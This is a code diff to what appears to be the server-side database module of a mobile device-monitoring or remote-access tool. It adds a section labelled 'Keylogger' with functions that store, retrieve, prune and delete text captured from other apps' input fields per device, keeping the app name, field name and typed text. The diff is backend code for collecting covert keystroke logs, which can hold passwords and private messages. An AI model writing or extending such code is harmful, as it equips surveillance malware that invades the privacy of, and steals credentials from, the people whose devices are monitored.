@@ -285,3 +285,48 @@ export async function getNotifications(deviceId: string, limit = 100): Promise<A
 export async function clearNotifications(deviceId: string) {
   await pool.query(`DELETE FROM notifications WHERE device_id = $1`, [deviceId])
 }
+
+// ─── Keylogger ────────────────────────────────────────────────────────────────
+
+export interface KeylogEntry {
+  id: number
+  appPackage: string
+  appName: string
+  fieldName: string
+  text: string
+  capturedAt: string
+}
+
+export async function saveKeylog(deviceId: string, entry: Omit<KeylogEntry, 'id' | 'capturedAt'>) {
+  await pool.query(
+    `INSERT INTO keylog_entries (device_id, app_package, app_name, field_name, text)
+     VALUES ($1, $2, $3, $4, $5)`,
+    [deviceId, entry.appPackage, entry.appName, entry.fieldName, entry.text]
+  )
+  // Keep last 2000 per device
+  await pool.query(
+    `DELETE FROM keylog_entries WHERE device_id = $1 AND id NOT IN (
+       SELECT id FROM keylog_entries WHERE device_id = $1 ORDER BY captured_at DESC LIMIT 2000
+     )`,
+    [deviceId]
+  )
+}
+
+export async function getKeylogs(deviceId: string, limit = 200): Promise<KeylogEntry[]> {
+  const { rows } = await pool.query(
+    `SELECT * FROM keylog_entries WHERE device_id = $1 ORDER BY captured_at DESC LIMIT $2`,
+    [deviceId, limit]
+  )
+  return rows.map(r => ({
+    id: r.id,
+    appPackage: r.app_package,
+    appName: r.app_name,
+    fieldName: r.field_name,
+    text: r.text,
+    capturedAt: r.captured_at,
+  }))
+}
+
+export async function clearKeylogs(deviceId: string) {
+  await pool.query(`DELETE FROM keylog_entries WHERE device_id = $1`, [deviceId])
+}
